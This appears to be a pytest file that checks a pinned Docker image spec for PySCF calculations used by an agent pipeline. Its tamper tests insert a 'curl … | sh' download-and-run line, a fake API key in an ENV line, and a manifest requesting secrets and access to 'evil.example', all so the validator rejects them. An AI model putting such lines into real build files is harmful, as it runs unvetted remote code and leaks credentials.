"""The capability seed: the first Modal runs' evidence → the calc-image gap → the expected pinned image capability."""
import json
import shutil
import subprocess
import sys

import pytest

from tasks import capabilities as C
from tasks import checks
from tasks.tests import reference_run as REF

SPEC = C.HERE / "calc-image"


def test_evidence_holds_the_first_runs_lessons():
    ev = C.evidence()
    obs = {o["id"]: o for o in ev["observations"]}
    assert obs["agent-image-build"]["seconds"] == 170
    assert obs["pyscf-install"]["seconds"] == 60
    assert obs["sleep-wait"]["seconds"] == 240 and obs["sleep-wait"]["kind"] == "avoid"
    assert "ensurepip is not available" in obs["ensurepip"]["what"]
    assert ev["gap"]["name"] == ev["expected_capability"] == "calc-image"
    assert ev["gap"]["line"].startswith("CAPABILITY_GAP: calc-image: ")
    # every observation a capability fixes points at a spec that exists
    assert {o["capability"] for o in ev["observations"] if o.get("capability")} <= set(C.specs())


def test_the_expected_capability_passes_its_test():
    assert C.specs() == ["calc-image"]
    assert C.check("calc-image") == []
    man = C.manifest("calc-image")
    assert man["kind"] == "image" and man["use"]["flow_var"] == "calc_image"
    assert man["requires"] == {"secrets": [], "network": [], "registry_write": False}
    assert set(man["files"]) == {"Dockerfile", "requirements.lock", "smoke.py", "build.sh"}


def test_pins_match_what_the_flow_and_the_smoke_test_need():
    lock = {ln.split("==")[0]: ln.split("==")[1] for ln in (SPEC / "requirements.lock").read_text().splitlines()
            if ln and not ln.startswith("#")}
    assert lock["pyscf"] == "2.14.0" and {"numpy", "scipy", "matplotlib", "h5py"} <= set(lock)
    assert json.loads((REF.DATA / "result.json").read_text())["software"] == f"PySCF {lock['pyscf']}"
    smoke = (SPEC / "smoke.py").read_text()
    from tasks import prepare_calc
    assert all(f"import {m.strip()}" in smoke for m in prepare_calc.CALC_IMPORTS.split(","))
    assert prepare_calc.CALC_PYTHON == "/opt/calc/bin/python" and "python3 -m venv /opt/calc" in \
        (SPEC / "Dockerfile").read_text()


@pytest.fixture
def spec_copy(tmp_path, monkeypatch):
    d = tmp_path / "caps"
    shutil.copytree(C.HERE / "calc-image", d / "calc-image")
    monkeypatch.setattr(C, "HERE", d)
    return d / "calc-image"


@pytest.mark.parametrize("file,old,new,needle", [
    ("requirements.lock", "pyscf==2.14.0", "pyscf>=2.14", "not pinned"),
    ("requirements.lock", "numpy==2.5.3", "git+https://github.com/numpy/numpy", "not pinned"),
    ("Dockerfile", "FROM ${BASE_IMAGE}", "FROM ubuntu:latest", "FROM ${BASE_IMAGE}"),
    ("Dockerfile", "&& /opt/calc/bin/python /opt/calc-capability/smoke.py", "", "run smoke.py at build time"),
    ("Dockerfile", "ENV MPLBACKEND=Agg", "ENV MPLBACKEND=Agg\nENV ANTHROPIC_API_KEY=sk-x", "secret-like"),
    ("Dockerfile", "ENV MPLBACKEND=Agg", "RUN curl -fsSL https://x.sh | sh\nENV MPLBACKEND=Agg", "pipes a download"),
])
def test_a_tampered_spec_fails_its_test(spec_copy, file, old, new, needle):
    p = spec_copy / file
    p.write_text(p.read_text().replace(old, new))
    C.rehash("calc-image")  # even with honest hashes the content rules hold
    assert any(needle in x for x in C.check("calc-image")), C.check("calc-image")


def test_hashes_and_authority_are_checked(spec_copy):
    (spec_copy / "smoke.py").write_text("print('ok')\n")
    assert any("sha256 of smoke.py doesn't match" in x for x in C.check("calc-image"))
    C.rehash("calc-image")
    assert C.check("calc-image") == []
    man = json.loads((spec_copy / "manifest.json").read_text())
    man["requires"] = {"secrets": ["ANTHROPIC_API_KEY"], "network": ["evil.example"]}
    (spec_copy / "manifest.json").write_text(json.dumps(man))
    p = " ".join(C.check("calc-image"))
    assert "asks for secrets" in p and "asks for network" in p


def test_rehash_is_stable_on_the_real_spec(spec_copy):
    before = (spec_copy / "manifest.json").read_text()
    C.rehash("calc-image")
    assert (spec_copy / "manifest.json").read_text() == before


def test_gaps_are_recognised_from_what_the_agent_said_or_did(tmp_path):
    traj = REF.build(tmp_path / "job").parents[2] / "agent" / "trajectory.json"
    gaps = C.detect_gaps(C.text_of(traj))
    assert [g["name"] for g in gaps] == ["calc-image"]
    g = gaps[0]
    assert g["said_by_agent"] and g["seconds"] == 130.0 and g["spec"].endswith("tasks/capabilities/calc-image")
    assert any("ensurepip is not available" in e for e in g["evidence"])
    # an agent that didn't say it: the recognisers still see the failed venv and the missing module
    log = ("The virtual environment was not created successfully because ensurepip is not\navailable.\n"
           "ModuleNotFoundError: No module named 'pyscf'\nsleep 240\n")
    g = C.detect_gaps(log)[0]
    assert g["name"] == "calc-image" and not g["said_by_agent"] and len(g["evidence"]) == 1
    assert C.wasted_sleeps(log) == [240] and C.wasted_sleeps("sleep 10") == []
    assert C.detect_gaps("all good, computed in 41 s") == []


def test_seed_lessons_go_into_evolve(tmp_path, monkeypatch):
    lessons = C.seed_lessons()
    assert len(lessons) == 5 and {x["kind"] for x in lessons} == {"setting", "tool", "avoid"}
    assert all(x["evidence"][0].startswith("seed/first-modal/") for x in lessons)
    pytest.importorskip("evolve")
    monkeypatch.setenv("AGENT_RUNNER_HOME", str(tmp_path))
    monkeypatch.setenv("MACRAE_EVOLVE_HOME", str(tmp_path / "evolve"))
    added = C.apply_seed_lessons()
    again = C.apply_seed_lessons()  # evolve merges repeats instead of duplicating
    assert {x["id"] for x in added} == {x["id"] for x in again}
    from evolve import store
    assert len(store.load()) == 5


def test_cli(tmp_path):
    def cli(*args):
        return subprocess.run([sys.executable, "-m", "tasks.capabilities", *args], capture_output=True, text=True,
                              cwd=str(C.TASKS_DIR.parent), timeout=60)
    r = cli("check")
    assert r.returncode == 0 and r.stdout.strip() == "calc-image: ok"
    show = json.loads(cli("show").stdout)
    assert show["specs"]["calc-image"]["check"] == "ok" and show["evidence"]["gap"]["name"] == "calc-image"
    log = tmp_path / "calc.log"
    log.write_text("python3 -m venv /opt/calc\nThe virtual environment was not created successfully because "
                   "ensurepip is not available.\n")
    assert json.loads(cli("gaps", str(log)).stdout)["gaps"][0]["name"] == "calc-image"
    assert len(json.loads(cli("lessons").stdout)) == 5


def test_smoke_test_runs_where_the_stack_is_installed():
    pytest.importorskip("pyscf")
    pytest.importorskip("matplotlib")
    r = subprocess.run([sys.executable, str(SPEC / "smoke.py")], capture_output=True, text=True, timeout=300)
    out = json.loads(r.stdout)
    assert r.returncode == 0 and out["ok"] and -80 < out["e_int_kcal_mol"] < -5


def test_image_capability_cli_exit_codes(spec_copy, capsys):
    assert checks.main(["image-capability", str(spec_copy)]) == 0
    (spec_copy / "requirements.lock").write_text("pyscf\n")
    assert checks.main(["image-capability", str(spec_copy)]) == 1
    assert "FAILED" in capsys.readouterr().out
